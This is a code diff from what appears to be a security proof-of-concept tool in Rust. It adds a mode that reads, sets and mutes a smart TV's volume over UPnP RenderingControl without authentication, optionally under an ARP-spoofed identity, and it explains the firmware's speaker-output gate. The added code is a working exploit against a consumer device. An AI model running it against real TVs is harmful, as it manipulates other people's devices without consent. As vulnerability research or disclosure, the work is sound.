@@ -688,6 +688,9 @@ fn usage() {
   --media <path>     mp4 to serve, faststart    (default ./media.mp4)
   --port <n>         local HTTP port            (default {DEFAULT_PORT})
   --status           read-only: transport + caption state, then exit
+  --vol              RenderingControl PoC: read volume, set it, read it back
+  --set-volume <n>   volume --vol should set                    (default 6)
+  --mute             also fire SetMute(1) during --vol
   --stop             Stop playback + disable the caption, then exit
   --no-caption       A/B control: same media, no subtitle bound
   --ctrl-caption     also fire X_ControlCaption(Enable) during playback
@@ -781,6 +784,75 @@ fn run() {
         if let Some(sp) = spoof() {
             rawtcp::spawn_arp_responder(sp);
         }
+    }
+
+    // --vol: the RenderingControl half of the PoC, ported from vol_poc.py so both
+    // live in one binary and both can run through a spoofed identity.
+    // Read the volume, set it, read it back - no auth header anywhere.
+    if args.has("--vol") {
+        let want: u16 = args.val("--set-volume").and_then(|v| v.parse().ok()).unwrap_or(6);
+        println!("=== Unauthenticated RenderingControl volume PoC vs {tv_ip} (no auth header) ===");
+
+        let read = |label: &str| -> (u16, Option<u16>) {
+            let (c, raw) = tv.rc("GetVolume", "<Channel>Master</Channel>");
+            let v = tag(&raw, "CurrentVolume").and_then(|s| s.trim().parse::<u16>().ok());
+            println!(
+                "{label} GetVolume        -> HTTP {c}   CurrentVolume = {}",
+                v.map(|v| v.to_string()).unwrap_or_else(|| "?".into())
+            );
+            (c, v)
+        };
+
+        let (_, v0) = read("[1]");
+        let Some(v0) = v0 else {
+            println!("    could not read the volume - is the TV awake and reachable?");
+            return;
+        };
+
+        let (c, raw) = tv.rc(
+            "SetVolume",
+            &format!("<Channel>Master</Channel><DesiredVolume>{want}</DesiredVolume>"),
+        );
+        let code = tag(&raw, "errorCode").unwrap_or("?");
+        let desc = tag(&raw, "errorDescription").unwrap_or("?");
+        println!(
+            "[2] SetVolume({want})     -> HTTP {c}   {}",
+            if c == 200 { "OK (accepted)".to_string() } else { format!("UPnPError {code} / {desc}") }
+        );
+        if c != 200 {
+            // Not a bug in this tool: dmr (dmr_service_app, SoundControlApi.cpp
+            // updateSpeakerInfo) maps the current Sound Output to a speaker object,
+            // and EXTERNAL_SPEAKER / BT_HEADSET / DUAL_BT_SPK all fall through to
+            // NonSupportedSpeaker, whose setVolume fails -> 501. Only case 0,
+            // "TV Speaker", accepts volume control, and RenderingControl exposes no
+            // action to switch the output, so it cannot be forced remotely.
+            println!("    501 here is a firmware gate, not a failure of the PoC: volume control");
+            println!("    only works while Sound Output = TV Speaker. External speaker, BT");
+            println!("    headset and dual BT all map to NonSupportedSpeaker in dmr, and no");
+            println!("    DLNA action can change the output. To exercise it: TV Settings ->");
+            println!("    Sound -> Sound Output -> TV Speaker, then re-run.");
+        }
+
+        if args.has("--mute") {
+            let (c, raw) = tv.rc("SetMute", "<Channel>Master</Channel><DesiredMute>1</DesiredMute>");
+            println!(
+                "[2b] SetMute(1)      -> HTTP {c}   {}",
+                if c == 200 { "OK".into() } else { format!("UPnPError {}", tag(&raw, "errorCode").unwrap_or("?")) }
+            );
+        }
+
+        let (_, v1) = read("[3]");
+        println!("\n=== RESULT ===");
+        match v1 {
+            Some(v) if v == want => {
+                println!("CONFIRMED: volume read {v0} -> set to {want} -> read back {v}, all over UPnP");
+                println!("with NO authentication. Unauthenticated state manipulation, proven live.");
+                println!("(the original volume {v0} was NOT restored)");
+            }
+            Some(v) => println!("SetVolume did not take effect (read back {v}); see the codes above."),
+            None => println!("could not read the volume back."),
+        }
+        return;
     }
 
     if args.has("--status") {
